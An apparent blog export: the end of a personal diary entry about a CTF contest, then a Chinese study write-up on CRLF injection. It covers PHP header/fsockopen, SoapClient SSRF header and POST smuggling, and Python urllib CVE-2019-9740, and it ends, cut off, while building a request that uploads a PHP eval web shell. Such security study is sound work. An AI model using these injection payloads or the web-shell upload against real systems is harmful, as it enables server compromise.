<p>但是讲实话，队内赛结束 那个晚上到1点才睡着，和老同学也聊了好久，怀疑过自己适不适合打web，适不适合继续打CTF，质疑过自己的能力</p>
<p>但是就算没有才能又如何呢。。坚定不移的走自己喜欢的道路就好了</p>
<p>额，但是你怎么知道我昨天单抽两个up😋</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250802125708921.png" alt="image-20250802125708921"></p>
<p>和<s>老班长</s>义父的相谈</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250802125911183.png" alt="image-20250802125911183"></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250802125924247.png" alt="image-20250802125924247"></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250802130053483.png" alt="image-20250802130053483"></p>
<p>19发单抽拿下当期2个up嘻嘻，爽赤了</p>
]]></content>
      <tags>
        <tag>-随笔</tag>
      </tags>
  </entry>
  <entry>
    <title>CRLF注入漏洞</title>
    <url>/2025/07/14/CRLF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="crlf注入漏洞"><a class="markdownIt-Anchor" href="#crlf注入漏洞"></a> CRLF注入漏洞</h1>
<p>CRLF，感觉好高级的名词啊。。</p>
<p>但是如果我告诉你CR是回车，LF是换行，是不是感觉就好多了?</p>
<h2 id="crlf是怎么造成漏洞的呢"><a class="markdownIt-Anchor" href="#crlf是怎么造成漏洞的呢"></a> CRLF是怎么造成漏洞的呢</h2>
<p>在HTTP协议中，HTTP Header 部分与 HTTP Body 部分是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制 HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些恶意的HTTP Header，如会话Cookie，甚至可以注入一些HTML代码。这就是CRLF注入漏洞的核心原理。</p>
<p>在实际应用中，如果Web应用没有对用户输入做严格验证，便会导致攻击者可以输入一些恶意字符。攻击者一旦向请求行或首部中的字段注入恶意的CRLF，就能注入一些首部字段或报文主体，并在响应中输出，所以CRLF注入漏洞又称为HTTP响应拆分漏洞（HTTP Response Splitting），简称HRS。</p>
<h2 id="location字段的302跳转"><a class="markdownIt-Anchor" href="#location字段的302跳转"></a> Location字段的302跳转</h2>
<p><code>Location</code>字段，说实话我也不熟悉，响应头这块没仔细的去了解过</p>
<p>了解后知道<strong>Location</strong> 响应头用于指定需要将页面重新定向至的地址。它通常在响应码为 <strong>3xx</strong> 的响应中才有意义，例如 <strong>301 (永久重定向)</strong>、<strong>302 (临时重定向)</strong>、<strong>303 (See Also)</strong>、<strong>307 (Temporary Redirect)</strong> 和 <strong>308 (Permanent Redirect)</strong></p>
<p>一般网站会在HTTP头中使用<code>Location: http://baidu.com</code> 这种方式来进行302跳转，如果我们能控制 <code>Location:</code> 后面的某个网址的URL，就可以进行CRLF攻击。</p>
<p>测试代码：</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>]))&#123;

    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: &quot;</span> . <span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>]);
    <span class="keyword">exit</span>;
&#125;
<span class="meta">?&gt;</span></code></pre>
<p>这段代码的意思是：当条件满足时，将请求包中的url参数值拼接到Location字符串中，并设置成响应头发送给客户端。</p>
<p>首先我们输入正常的url：<code>/?url=https://ayan0.top</code></p>
<p>得到一个正常的302跳转包的响应头是这样的:</p>
<pre><code class="highlight http"><span class="meta">HTTP/1.1</span> <span class="number">302</span> Moved Temporarily
<span class="attribute">Server</span><span class="punctuation">: </span>nginx/1.15.11
<span class="attribute">Date</span><span class="punctuation">: </span>Mon, 14 Jul 2025 06:39:25 GMT
<span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html
<span class="attribute">Connection</span><span class="punctuation">: </span>close
<span class="attribute">X-Powered-By</span><span class="punctuation">: </span>PHP/5.3.29
<span class="attribute">Location</span><span class="punctuation">: </span>https://ayan0.top
<span class="attribute">Content-Length</span><span class="punctuation">: </span>880</code></pre>
<p>但如果我们抓包，将输入的URL改为 <code>/?url=https://ayan0.top%0d%0aPHPSESSID=whoami</code>，注入了一个换行。将修改后的请求包提交给服务器端，查看服务器端的响应。预期内返回包的<strong>响应头</strong>就会变成这样：</p>
<pre><code class="highlight http"><span class="meta">HTTP/1.1</span> <span class="number">302</span>  Moved Temporarily  
Content- Type: text/html
<span class="attribute">Content-Length</span><span class="punctuation">: </span>88
<span class="attribute">Date</span><span class="punctuation">: </span>Mon, 14 Jul 2025 06:39:25 GMT
<span class="attribute">Connection</span><span class="punctuation">: </span>close
<span class="attribute">Location</span><span class="punctuation">: </span>https://ayan0.top
<span class="attribute">Set-Cookie</span><span class="punctuation">: </span>PHPSESSID=whoami</code></pre>
<p>但是真的如此，吗</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250714145107226.png" alt="image-20250714145107226"></p>
<p>可以看到，出现了报错，很明显，我们的换行符被探测出来了。</p>
<p>网上找了一些博客，发现很多师傅也遇上了同样的问题，并且这个问题在5.x-7.x内是都存在的</p>
<p>看起来是因为这个漏洞已经被修复了，并且在Nodejs中也无法得到复现呜呜</p>
<h2 id="php-fsockopen-函数"><a class="markdownIt-Anchor" href="#php-fsockopen-函数"></a> PHP fsockopen() 函数</h2>
<p><code>fsockopen($hostname,$port,$errno,$errstr,$timeout)</code> 用于打开一个网络连接或者一个Unix 套接字连接，初始化一个套接字连接到指定主机（hostname），实现对用户指定url数据的获取。该函数会使用socket跟服务器建立tcp连接，进行传输原始数据。<br>
fsockopen()将返回一个文件句柄，之后可以被其他文件类函数调用（例如：fgets()，fgetss()，fwrite()，fclose()还有feof()）。如果调用失败，将返回false。</p>
<p>测试代码：</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="variable">$host</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];
<span class="variable">$fp</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>, <span class="number">80</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);
<span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123;
    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (<span class="subst">$errno</span>)&lt;br /&gt;\n&quot;</span>;
&#125; <span class="keyword">else</span> &#123;
    <span class="variable">$out</span> = <span class="string">&quot;GET / HTTP/1.1\r\n&quot;</span>;
    <span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>;
    <span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>;
    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$out</span>);
    <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123;
        <span class="keyword">echo</span> <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">128</span>);
    &#125;
    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);
&#125;
<span class="meta">?&gt;</span></code></pre>
<p>首先我们尝试访问正常的url：</p>
<pre><code class="highlight plaintext">/?url=47.1xx.1x1.1xx:9999</code></pre>
<p>VPS 上监听到的请求：</p>
<pre><code class="highlight plaintext">Connection received on 60.1x.1xx.1xx 40605
GET / HTTP/1.1
Host: 47.1xx.1x1.1xx:9999
Connection: Close</code></pre>
<h3 id="在host头部注入"><a class="markdownIt-Anchor" href="#在host头部注入"></a> 在Host头部注入</h3>
<p>下面我们尝试插入 CRLF：</p>
<pre><code class="highlight plaintext">/?url=47.1xx.1x1.1xx:9999%0d%0aSet-Cookie: PHPSESSID=whoami</code></pre>
<p>没想到成功复现了。激动</p>
<pre><code class="highlight plaintext">Listening on 0.0.0.0 9999
Connection received on 60.1x.1xx.1xx 40605
GET / HTTP/1.1
Host: 47.1xx.1x1.1xx:9999
Set-Cookie: PHPSESSID=whoami
Connection: Close</code></pre>
<p>这是由于，此时服务端接收到的url参数值是我们修改后的：</p>
<pre><code class="highlight plaintext">/?url=47.1xx.1x1.1xx:9999%0d%0aSet-Cookie: PHPSESSID=whoami</code></pre>
<p>而在url参数值拼接到 Host 字段值中，设置成响应头后，响应包此时应该是如下这样的：</p>
<pre><code class="highlight http"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span>
<span class="attribute">Host</span><span class="punctuation">: </span>47.1xx.1x1.1xx:9999%0d%0aSet-Cookie: PHPSESSID=whoami
<span class="attribute">Connection</span><span class="punctuation">: </span>Close</code></pre>
<p>接着就会被处理为</p>
<pre><code class="highlight http"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span>
<span class="attribute">Host</span><span class="punctuation">: </span>47.1xx.1x1.1xx:9999
<span class="attribute">Set-Cookie</span><span class="punctuation">: </span>PHPSESSID=whoami
<span class="attribute">Connection</span><span class="punctuation">: </span>Close</code></pre>
<p>而我们构造的 Set-Cookie 字符在 HTTP 中是一个设置 Cookie 的首部字段，这个时候就会将 PHPSESSID=whoami 设置成 Cookie。</p>
<h2 id="php-soapclient-类"><a class="markdownIt-Anchor" href="#php-soapclient-类"></a> PHP SoapClient 类</h2>
<p>PHP 的内置类 SoapClient 是一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的 PHP 客户端。该内置类有一个 <code>__call</code> 方法，当 <code>__call</code> 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 <code>__call</code> 方法，使得 SoapClient 类可以被我们运用在 SSRF 中。</p>
<p>该类的构造函数如下：</p>
<pre><code class="highlight php"><span class="keyword">public</span> SoapClient :: <span class="title function_ invoke__">SoapClient</span>(<span class="keyword">mixed</span> <span class="variable">$wsdl</span> [，<span class="keyword">array</span> <span class="variable">$options</span> ])</code></pre>
<ul>
<li>第一个参数是用来指明是否是wsdl模式，将该值设为null则表示非wsdl模式。</li>
<li>第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而 uri 是SOAP服务的目标命名空间。</li>
</ul>
<p>知道上述两个参数的含义后，我们首先来发起一个正常的HTTP请求：</p>
<pre><code class="highlight plaintext">&lt;?php
$a = new SoapClient(null,array(&#x27;location&#x27;=&gt;&#x27;http://47.1xx.1x1.1xx:9999/aaa&#x27;, &#x27;uri&#x27;=&gt;&#x27;http://47.1xx.1x1.1xx:9999&#x27;));
$b = serialize($a);
echo $b;
$c = unserialize($b);
$c-&gt;a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf
?&gt;</code></pre>
<p>在VPS上监听到了POST请求</p>
<pre><code class="highlight http"><span class="keyword">POST</span> <span class="string">/aaa</span> <span class="meta">HTTP/1.1</span>
<span class="attribute">Host</span><span class="punctuation">: </span>47.111.141.135:9999
<span class="attribute">Connection</span><span class="punctuation">: </span>Keep-Alive
<span class="attribute">User-Agent</span><span class="punctuation">: </span>PHP-SOAP/5.3.29
<span class="attribute">Content-Type</span><span class="punctuation">: </span>text/xml; charset=utf-8
<span class="attribute">SOAPAction</span><span class="punctuation">: </span>&quot;http://47.111.141.135:9999#a&quot;
<span class="attribute">Content-Length</span><span class="punctuation">: </span>387

<span class="language-ruby">&lt;<span class="string">?x</span>ml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span><span class="string">?&gt;</span></span>
<span class="language-ruby">&lt;<span class="variable constant_">SOAP</span>-<span class="variable constant_">ENV</span><span class="symbol">:Envelope</span> <span class="symbol">xmlns:</span><span class="variable constant_">SOAP</span>-<span class="variable constant_">ENV</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span> <span class="symbol">xmlns:</span>ns1=<span class="string">&quot;http://47.111.141.135:9999&quot;</span> <span class="symbol">xmlns:</span>xsd=<span class="string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span> <span class="symbol">xmlns:</span><span class="variable constant_">SOAP</span>-<span class="variable constant_">ENC</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;</span> <span class="variable constant_">SOAP</span>-<span class="variable constant_">ENV</span><span class="symbol">:encodingStyle=<span class="string">&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;</span>&gt;&lt;SOAP-ENV</span><span class="symbol">:Body&gt;&lt;ns1</span><span class="symbol">:a/&gt;&lt;/SOAP-ENV</span><span class="symbol">:Body&gt;&lt;/SOAP-ENV</span><span class="symbol">:Envelope&gt;</span></span></code></pre>
<p>接下来就尝试CRLF注入,插入任意的HTTP头</p>
<h3 id="在-user-agent-头部注入"><a class="markdownIt-Anchor" href="#在-user-agent-头部注入"></a> 在 User-Agent 头部注入</h3>
<pre><code class="highlight PHP"><span class="meta">&lt;?php</span>
<span class="variable">$target</span> = <span class="string">&#x27;http://47.111.141.135:9999/&#x27;</span>;
<span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>, <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="string">&quot;WHOAMI\r\nSet-Cookie: PHPSESSID=whoami&quot;</span>, <span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&#x27;test&#x27;</span>));
<span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);
<span class="keyword">echo</span> <span class="variable">$b</span>;
<span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);
<span class="variable">$c</span>-&gt;<span class="title function_ invoke__">a</span>();    <span class="comment">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span>
<span class="meta">?&gt;</span></code></pre>
<p>VPS 上监听到了请求，成功在HTTP头中插入了一个我们自定义的 cookie：</p>
<pre><code class="highlight http"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span>
<span class="attribute">Host</span><span class="punctuation">: </span>47.111.141.135:9999
<span class="attribute">Connection</span><span class="punctuation">: </span>Keep-Alive
<span class="attribute">User-Agent</span><span class="punctuation">: </span>WHOAMI
<span class="attribute">Set-Cookie</span><span class="punctuation">: </span>PHPSESSID=whoami
<span class="attribute">Content-Type</span><span class="punctuation">: </span>text/xml; charset=utf-8
<span class="attribute">SOAPAction</span><span class="punctuation">: </span>&quot;test#a&quot;
<span class="attribute">Content-Length</span><span class="punctuation">: </span>365

<span class="language-ruby">&lt;<span class="string">?x</span>ml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span><span class="string">?&gt;</span></span>
<span class="language-ruby">&lt;<span class="variable constant_">SOAP</span>-<span class="variable constant_">ENV</span><span class="symbol">:Envelope</span> <span class="symbol">xmlns:</span><span class="variable constant_">SOAP</span>-<span class="variable constant_">ENV</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span> <span class="symbol">xmlns:</span>ns1=<span class="string">&quot;test&quot;</span> <span class="symbol">xmlns:</span>xsd=<span class="string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span> <span class="symbol">xmlns:</span><span class="variable constant_">SOAP</span>-<span class="variable constant_">ENC</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;</span> <span class="variable constant_">SOAP</span>-<span class="variable constant_">ENV</span><span class="symbol">:encodingStyle=<span class="string">&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;</span>&gt;&lt;SOAP-ENV</span><span class="symbol">:Body&gt;&lt;ns1</span><span class="symbol">:a/&gt;&lt;/SOAP-ENV</span><span class="symbol">:Body&gt;&lt;/SOAP-ENV</span><span class="symbol">:Envelope&gt;</span></span></code></pre>
<h3 id="发送-post-数据包"><a class="markdownIt-Anchor" href="#发送-post-数据包"></a> 发送 POST 数据包</h3>
<p>在HTTP协议中，HTTP Header 部分与 HTTP Body 部分是用两个CRLF分隔的，所以我们要发送 POST 数据就要插入两个CRLF。</p>
<p>对于如何发送POST的数据包，这里面还有一个坑，就是 <code>Content-Type</code> 的设置，因为我们要提交的是POST数据，所以 <code>Content-Type</code> 的值我们要设置为 <code>application/x-www-form-urlencoded</code>，这里如何修改 <code>Content-Type</code> 的值呢？由于 <code>Content-Type</code> 在 <code>User-Agent</code> 的下面，所以我们可以通过 <code>SoapClient</code> 来设置 <code>User-Agent</code> ，将原来的 <code>Content-Type</code> 挤下去，从而再插入一个新的 <code>Content-Type</code> 。</p>
<p>测试代码如下：</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="variable">$target</span> = <span class="string">&#x27;http://47.111.141.135:9999/&#x27;</span>;
<span class="variable">$post_data</span> = <span class="string">&#x27;data=whoami&#x27;</span>;
<span class="variable">$headers</span> = <span class="keyword">array</span>(
    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,
    <span class="string">&#x27;Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93&#x27;</span>
);
<span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;WHOAMI^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.<span class="title function_ invoke__">join</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="variable">$headers</span>).<span class="string">&#x27;^^Content-Length: &#x27;</span>. (<span class="keyword">string</span>)<span class="title function_ invoke__">strlen</span>(<span class="variable">$post_data</span>).<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$post_data</span>,<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;test&#x27;</span>));
<span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);
<span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\n\r&quot;</span>,<span class="variable">$b</span>);
<span class="keyword">echo</span> <span class="variable">$b</span>;
<span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);
<span class="variable">$c</span>-&gt;<span class="title function_ invoke__">a</span>();    <span class="comment">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span>
<span class="meta">?&gt;</span></code></pre>
<p>VPS 上监听到了 POST 数据：</p>
<pre><code class="highlight plaintext">POST / HTTP/1.1
Host: 47.111.141.135:9999
Connection: Keep-Alive
User-Agent: WHOAMI
Content-Type: application/x-www-form-urlencoded
X-Forwarded-For: 127.0.0.1
Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93
Content-Length: 11

data=whoami
Content-Type: text/xml; charset=utf-8
SOAPAction: &quot;test#a&quot;
Content-Length: 365

&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:ns1=&quot;test&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:SOAP-ENC=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; SOAP-ENV:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;&lt;SOAP-ENV:Body&gt;&lt;ns1:a/&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt;</code></pre>
<h2 id="python-urllib-crlf-注入漏洞cve-2019-9740"><a class="markdownIt-Anchor" href="#python-urllib-crlf-注入漏洞cve-2019-9740"></a> Python urllib CRLF 注入漏洞（CVE-2019-9740）</h2>
<p>Python 2.x版本至2.7.16版本中的urllib2和Python 3.x版本至3.7.2版本中的urllib存在注入漏洞。该漏洞源于用户输入构造命令、数据结构或记录的操作过程中，网络系统或产品缺乏对用户输入数据的正确验证，未过滤或未正确过滤掉其中的特殊元素，导致系统或产品产生解析或解释方式错误。简单来说，就是urlopen()处理URL的时候没有考虑换行符，导致我们可以在正常的HTTP头中插入任意内容。</p>
<p>该漏洞早在2016年就被爆出（CVE-2016-5699），在之后的一段时间里不断爆出了python其他版本也存在该漏洞（CVE-2019-9740、CVE-2019-9947）。</p>
<p><strong>影响范围：</strong></p>
<ul>
<li>Python 2.x版本至2.7.16版本中的urllib2</li>
<li>Python 3.x版本至3.7.2版本中的urllib</li>
</ul>
<p>这里懒得再下个版本再复现了，直接引用其他师傅的记录吧</p>
<h3 id="在-http-状态行注入恶意首部字段"><a class="markdownIt-Anchor" href="#在-http-状态行注入恶意首部字段"></a> 在 HTTP 状态行注入恶意首部字段</h3>
<p>测试代码：</p>
<pre><code class="highlight python"><span class="comment">#!python</span>
<span class="comment">#!/usr/bin/env python3</span>
<span class="keyword">import</span> urllib
<span class="keyword">import</span> urllib.request
<span class="keyword">import</span> urllib.error

<span class="comment"># url = &quot;http://47.101.57.72:4000</span>
url = <span class="string">&quot;http://47.101.57.72:4000?a=1 HTTP/1.1\r\nCRLF-injection: True\r\nSet-Cookie: PHPSESSID=whoami&quot;</span>
<span class="comment"># ?a=1 后面的那个HTTP/1.1是为了闭合正常的HTTP状态行</span>
<span class="keyword">try</span>:
    info = urllib.request.urlopen(url).info()
    <span class="built_in">print</span>(info)

<span class="keyword">except</span> urllib.error.URLError <span class="keyword">as</span> e:
    <span class="built_in">print</span>(e)</code></pre>
<p>执行代码后，VPS 上会监听到如下HTTP头：</p>
<p><img src="https://p3.ssl.qhimg.com/t017291c25d0d4a0fc3.png" alt="img"></p>
<p>如上图所示，成功引发了CRLF漏洞。</p>
<p>这是由于服务端接收到我们修改后的请求后，响应包此时应该是如下这样的：</p>
<pre><code class="highlight http"><span class="keyword">GET</span> <span class="string">/?a=1</span> <span class="meta">HTTP/1.1</span>%0d%0a<span class="keyword">CRLF</span>-injection: <span class="string">True%0d%0aSet-Cookie:</span> <span class="keyword">PHPSESSID</span>=whoami <span class="string">HTTP/1.1</span>
<span class="string">Accept-Encoding:</span> identity
<span class="attribute">Host</span><span class="punctuation">: </span>47.101.57.72:4000
<span class="attribute">User-Agent</span><span class="punctuation">: </span>Python-urllib/3.7
<span class="attribute">Connection</span><span class="punctuation">: </span>close</code></pre>
<p>此时，HTTP 状态行中出现了%0d%0a，便会被解析为HTTP首部字段的结束并成功插入我们定制的HTTP首部字段。最终HTTP请求变成了下面这样：</p>
<pre><code class="highlight http"><span class="keyword">GET</span> <span class="string">/?a=1</span> <span class="meta">HTTP/1.1</span>
<span class="attribute">CRLF-injection</span><span class="punctuation">: </span>True
<span class="attribute">Set-Cookie</span><span class="punctuation">: </span>PHPSESSID=whoami HTTP/1.1
<span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>identity
<span class="attribute">Host</span><span class="punctuation">: </span>47.101.57.72:4000
<span class="attribute">User-Agent</span><span class="punctuation">: </span>Python-urllib/3.7
<span class="attribute">Connection</span><span class="punctuation">: </span>close</code></pre>
<h3 id="在-http-状态行注入完整-http-请求"><a class="markdownIt-Anchor" href="#在-http-状态行注入完整-http-请求"></a> 在 HTTP 状态行注入完整 HTTP 请求</h3>
<p>首先，由于 Python Urllib 的这个 CRLF 注入点在 HTTP 状态行，所以如果我们要注入完整的 HTTP 请求的话需要先闭合状态行中 <code>HTTP/1.1</code> ，即保证注入后有正常的 HTTP 状态行。其次为了不让原来的 <code>HTTP/1.1</code> 和 Host 字段影响我们新构造的请求，我们还需要再构造一次 <code>GET /</code> 闭合原来的 HTTP 请求。</p>
<p>假设目标主机存在SSRF，需要我们在目标主机本地上传文件。下面尝试构造如下这个文件上传的完整 POST 请求：</p>
<pre><code class="highlight http"><span class="keyword">POST</span> <span class="string">/upload.php</span> <span class="meta">HTTP/1.1</span>
<span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1
<span class="attribute">Content-Length</span><span class="punctuation">: </span>437
<span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6
<span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36
<span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
<span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate
<span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9
<span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=nk67astv61hqanskkddslkgst4
<span class="attribute">Connection</span><span class="punctuation">: </span>close

<span class="language-php">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span>
<span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;MAX_FILE_SIZE&quot;</span></span>
<span class="language-php"></span>
<span class="language-php"><span class="number">100000</span></span>
<span class="language-php">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span>
<span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;uploaded&quot;</span>; filename=<span class="string">&quot;shell.php&quot;</span></span>
<span class="language-php">Content-Type: application/octet-stream</span>
<span class="language-php"></span>
<span class="language-php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;whoami&quot;</span>]);<span class="meta">?&gt;</span></span>
<span class="language-php">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span>
<span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;Upload&quot;</span></span>
<span class="language-php"></span>
<span class="language-php">Upload</span>
<span class="language-php">------WebKitFormBoundaryjDb9HMGTixAA7Am6--</span></code></pre>
<p>编写脚本构造payload：</p>
<pre><code class="highlight python">payload = <span class="string">&#x27;&#x27;&#x27; HTTP/1.1</span>
<span class="string"></span>
<span class="string">POST /upload.php HTTP/1.1</span>
<span class="string">Host: 127.0.0.1</span>
<span class="string">Content-Length: 435</span>
<span class="string">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6</span>
<span class="string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36</span>
<span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span>
<span class="string">Accept-Encoding: gzip, deflate</span>
<span class="string">Accept-Language: zh-CN,zh;q=0.9</span>
<span class="string">Cookie: PHPSESSID=nk67astv61hqanskkddslkgst4</span>
<span class="string">Connection: close</span>
<span class="string"></span>
<span class="string">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span>
<span class="string">Content-Disposition: form-data; name=&quot;MAX_FILE_SIZE&quot;</span>
<span class="string"></span>
<span class="string">100000</span>
<span class="string">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span>
<span class="string">Content-Disposition: form-data; name=&quot;uploaded&quot;; filename=&quot;shell.php&quot;</span>
<span class="string">Content-Type: application/octet-stream</span>
<span class="string"></span>
<span class="string">&lt;?php eval($_POST[whoami]);?&gt;</span>
<span class="string">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span>
<span class="string">Content-Disposition: form-data; name=&quot;Upload&quot;</span>
<span class="string"></span>
<span class="string">Upload</span>
<span class="string">------WebKitFormBoundaryjDb9HMGTixAA7Am6--</span>
<span class="string"></span>
<span class="string">GET / HTTP/1.1</span>
<span class="string">test:&#x27;&#x27;&#x27;</span>.replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;\\r\\n&quot;</span>)

<span class="built_in">print</span>(payload)

<span class="comment"># 输出: HTTP/1.1\r\n\r\nPOST /upload.php HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Length: 435\r\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: zh-CN,zh;q=0.9\r\nCookie: PHPSESSID=nk67astv61hqanskkddslkgst4\r\nConnection: close\r\n\r\n------WebKitFormBoundaryjDb9HMGTixAA7Am6\r\nContent-Disposition: form-data; name=&quot;MAX_FILE_SIZE&quot;\r\n\r\n100000\r\n------WebKitFormBoundaryjDb9HMGTixAA7Am6\r\nContent-Disposition: form-data; name=&quot;uploaded&quot;; filename=&quot;shell.php&quot;\r\nContent-Type: application/octet-stream\r\n\r\n&lt;?php eval($_POST[whoami]);?&gt;\r\n------WebKitFormBoundaryjDb9HMGTixAA7Am6\r\nContent-Disposition: form-data; name=&quot;Upload&quot;\r\n\r\nUpload\r\n------WebKitFormBoundaryjDb9HMGTixAA7Am6--\r\n\r\nGET / HTTP/1.1\r\ntest:</span></code></pre>
<p>然后构造请求：</p>
<pre><code class="highlight python"><span class="comment">#!python</span>
<span class="comment">#!/usr/bin/env python3</span>
<span class="keyword">import</span> urllib
<span class="keyword">import</span> urllib.request
<span class="keyword">import</span> urllib.error

